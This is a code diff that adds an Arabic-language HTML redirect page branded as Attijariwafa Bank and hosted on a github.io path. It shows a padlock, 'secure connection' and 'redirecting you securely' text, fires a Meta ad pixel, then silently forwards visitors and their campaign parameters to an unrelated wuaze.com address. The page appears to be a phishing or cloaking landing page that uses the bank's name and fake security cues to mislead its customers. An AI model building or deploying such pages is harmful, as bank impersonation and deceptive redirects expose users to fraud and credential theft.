@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+  <meta name="theme-color" content="#f4f7fb" media="(prefers-color-scheme: light)">
+  <meta name="theme-color" content="#0b1220" media="(prefers-color-scheme: dark)">
+  <meta name="color-scheme" content="light dark">
+  <meta name="robots" content="noindex, follow">
+  <meta name="referrer" content="strict-origin-when-cross-origin">
+
+  <title>Attijariwafa Bank | التجاري وفا بنك</title>
+  <meta name="description" content="التجاري وفا بنك">
+  <link rel="canonical" href="https://websitere.github.io/umbrella/">
+  <link rel="icon" type="image/jpg" href="images (5).jpg">
+  <link rel="apple-touch-icon" href="images (5).jpg">
+
+  <!-- Open Graph -->
+  <meta property="og:type" content="website">
+  <meta property="og:locale" content="ar_IQ">
+  <meta property="og:site_name" content="Attijariwafa Bank">
+  <meta property="og:title" content="Attijariwafa Bank | التجاري وفا بنك">
+  <meta property="og:description" content="التجاري وفا بنك">
+  <meta property="og:url" content="https://websitere.github.io/umbrella/">
+  <meta property="og:image" content="https://websitere.github.io/umbrella/images (5).jpg">
+  <meta property="og:image:secure_url" content="https://websitere.github.io/umbrella/images (5).jpg">
+  <meta property="og:image:type" content="image/jpeg">
+  <meta property="og:image:width" content="1024">
+  <meta property="og:image:height" content="512">
+  <meta property="og:image:alt" content="شعار Attijariwafa Bank">
+
+  <!-- Twitter / X -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Attijariwafa Bank | التجاري وفا بنك">
+  <meta name="twitter:description" content="التجاري وفا بنك">
+  <meta name="twitter:image" content="https://websitere.github.io/umbrella/images (5).jpg">
+
+  <link rel="preconnect" href="https://connect.facebook.net" crossorigin>
+  <link rel="dns-prefetch" href="https://www.facebook.com">
+  <link rel="preload" as="image" href="images (5).jpg" type="image/jpeg">
+
+  <style>
+    :root {
+      --bg: #f4f7fb;
+      --card: #ffffff;
+      --fg: #14202e;
+      --muted: #64748b;
+      --accent: #1d6fe8;
+      --accent-2: #14b8a6;
+      --track: #e2e8f0;
+      --shadow: 0 20px 50px -20px rgba(20, 32, 46, .25);
+    }
+    @media (prefers-color-scheme: dark) {
+      :root {
+        --bg: #0b1220; --card: #121b2d; --fg: #e8eef7;
+        --muted: #94a3b8; --track: #22304a; --accent: #4b94ff;
+        --shadow: 0 20px 50px -20px rgba(0, 0, 0, .7);
+      }
+    }
+    *, *::before, *::after { box-sizing: border-box; }
+    html, body { height: 100%; }
+    body {
+      margin: 0;
+      display: grid;
+      place-items: center;
+      padding: env(safe-area-inset-top) 1rem env(safe-area-inset-bottom);
+      color: var(--fg);
+      font-family: "Segoe UI", Tahoma, "Noto Sans Arabic", system-ui, Arial, sans-serif;
+      background:
+        radial-gradient(60rem 30rem at 85% -10%, color-mix(in srgb, var(--accent) 14%, transparent), transparent 60%),
+        radial-gradient(50rem 28rem at 0% 110%, color-mix(in srgb, var(--accent-2) 14%, transparent), transparent 60%),
+        var(--bg);
+      -webkit-font-smoothing: antialiased;
+    }
+    .card {
+      width: min(100%, 380px);
+      background: var(--card);
+      border-radius: 24px;
+      padding: 2.25rem 1.75rem 1.75rem;
+      text-align: center;
+      box-shadow: var(--shadow);
+      animation: rise .5s ease-out both;
+    }
+    .logo-wrap {
+      width: 112px; height: 112px;
+      margin: 0 auto 1.25rem;
+      display: grid; place-items: center;
+      border-radius: 50%;
+      position: relative;
+    }
+    .logo-wrap::before {
+      content: ""; position: absolute; inset: 0;
+      border-radius: 50%;
+      border: 3px solid var(--track);
+      border-top-color: var(--accent);
+      animation: spin 1s linear infinite;
+    }
+    .logo { width: 72px; height: auto; border-radius: 12px; animation: pulse 1.6s ease-in-out infinite; }
+    h1 { margin: 0 0 .35rem; font-size: 1.2rem; font-weight: 700; }
+    .sub { margin: 0; font-size: .92rem; color: var(--muted); line-height: 1.7; }
+    .progress {
+      height: 6px; margin: 1.5rem 0 1rem;
+      background: var(--track); border-radius: 999px; overflow: hidden;
+    }
+    .bar {
+      height: 100%; width: 0;
+      background: linear-gradient(90deg, var(--accent), var(--accent-2));
+      border-radius: inherit;
+      transition: width .1s linear;
+    }
+    .hint { margin: 0; font-size: .85rem; color: var(--muted); }
+    .hint a {
+      color: var(--accent); font-weight: 600; text-decoration: none;
+      border-bottom: 1px dashed currentColor;
+    }
+    .hint a:focus-visible { outline: 2px solid var(--accent); outline-offset: 3px; border-radius: 4px; }
+    .secure {
+      margin-top: 1.25rem; padding-top: 1rem;
+      border-top: 1px solid var(--track);
+      font-size: .78rem; color: var(--muted);
+      display: flex; justify-content: center; align-items: center; gap: .4rem;
+    }
+    .secure svg { width: 14px; height: 14px; fill: none; stroke: currentColor; stroke-width: 2; }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+    @keyframes pulse { 0%,100% { transform: scale(.94); opacity: .85; } 50% { transform: scale(1.04); opacity: 1; } }
+    @keyframes rise { from { opacity: 0; transform: translateY(12px); } to { opacity: 1; transform: none; } }
+    @media (prefers-reduced-motion: reduce) {
+      .card, .logo, .logo-wrap::before { animation: none; }
+      .bar { transition: none; }
+    }
+  </style>
+
+  <!-- Meta Pixel Code -->
+  <script>
+    !function(f,b,e,v,n,t,s){
+      if(f.fbq)return;
+      n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+      if(!f._fbq)f._fbq=n;
+      n.push=n; n.loaded=!0; n.version='2.0'; n.queue=[];
+      t=b.createElement(e); t.async=!0; t.src=v;
+      s=b.getElementsByTagName(e)[0];
+      s.parentNode.insertBefore(t,s);
+    }(window, document, 'script', 'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '1123573123391074');
+    fbq('track', 'PageView');
+  </script>
+  <!-- End Meta Pixel Code -->
+
+  <noscript>
+    <!-- بديل التحويل عند تعطيل جافاسكربت -->
+    <meta http-equiv="refresh" content="1;url=https://wuaze.com">
+  </noscript>
+</head>
+<body>
+
+  <main class="card" role="status" aria-live="polite">
+    <div class="logo-wrap">
+      <img src="images (5).jpg" alt="Attijariwafa Bank" class="logo" width="72" height="72" decoding="async" fetchpriority="high">
+    </div>
+    <h1>جارٍ تحويلك بأمان</h1>
+    <p class="sub">لحظات ونوصلك إلى الصفحة المطلوبة</p>
+
+    <div class="progress" aria-hidden="true"><div class="bar" id="bar"></div></div>
+
+    <p class="hint">إن لم يتم التحويل تلقائياً، <a id="manual-link" href="https://wuaze.com" rel="noopener">جارٍ تحويلك بأمان</a></p>
+
+    <div class="secure">
+      <svg viewBox="0 0 24 24" aria-hidden="true"><rect x="4" y="11" width="16" height="10" rx="2"/><path d="M8 11V7a4 4 0 0 1 8 0v4"/></svg>
+      <span>اتصال آمن</span>
+    </div>
+    <noscript><p class="hint" style="margin-top:1rem">جافاسكربت معطّل، سيتم تحويلك خلال ثانية.</p></noscript>
+    <noscript><img height="1" width="1" style="display:none" alt="" src="https://www.facebook.com/tr?id=1123573123391074&amp;ev=PageView&amp;noscript=1"></noscript>
+  </main>
+
+  <script>
+    (function () {
+      'use strict';
+
+      // ===== الإعدادات =====
+      var TARGET_URL = 'https://wuaze.com'; // وجهة التحويل (استبدلها بالرابط الكامل)
+      var MIN_MS = 900;    // أقل مدة قبل التحويل (لإرسال البكسل)
+      var MAX_MS = 1800;   // أقصى مدة انتظار حتى لو تعذّر تحميل البكسل
+
+      // الحفاظ على معاملات الحملات (utm_* و fbclid ...) عند التحويل
+      function buildTarget() {
+        try {
+          var url = new URL(TARGET_URL);
+          new URLSearchParams(window.location.search).forEach(function (v, k) {
+            if (!url.searchParams.has(k)) url.searchParams.set(k, v);
+          });
+          return url.toString();
+        } catch (e) { return TARGET_URL; }
+      }
+
+      var destination = buildTarget();
+      var link = document.getElementById('manual-link');
+      var bar = document.getElementById('bar');
+      if (link) link.href = destination;
+
+      var done = false;
+      function go() {
+        if (done) return;
+        done = true;
+        window.location.replace(destination); // لا يبقي الصفحة في سجل المتصفح
+      }
+
+      // شريط التقدم
+      var start = Date.now();
+      var timer = setInterval(function () {
+        var p = Math.min(100, ((Date.now() - start) / MIN_MS) * 100);
+        if (bar) bar.style.width = p + '%';
+        if (p >= 100) clearInterval(timer);
+      }, 50);
+
+      // التحويل بعد أن يكتمل الحد الأدنى ويُحمَّل البكسل، أو عند بلوغ الحد الأقصى
+      var minDone = false, pixelDone = false;
+      function check() { if (minDone && pixelDone) go(); }
+
+      setTimeout(function () { minDone = true; check(); }, MIN_MS);
+      setTimeout(go, MAX_MS);
+
+      // fbq.loaded يصبح true فور إنشائه، لذلك نتحقق من الاسكربت نفسه
+      var s = document.querySelector('script[src*="fbevents.js"]');
+      if (s) {
+        s.addEventListener('load',  function () { pixelDone = true; check(); });
+        s.addEventListener('error', function () { pixelDone = true; check(); }); // حاجب إعلانات
+      } else { pixelDone = true; }
+    })();
+  </script>
+</body>
+</html>
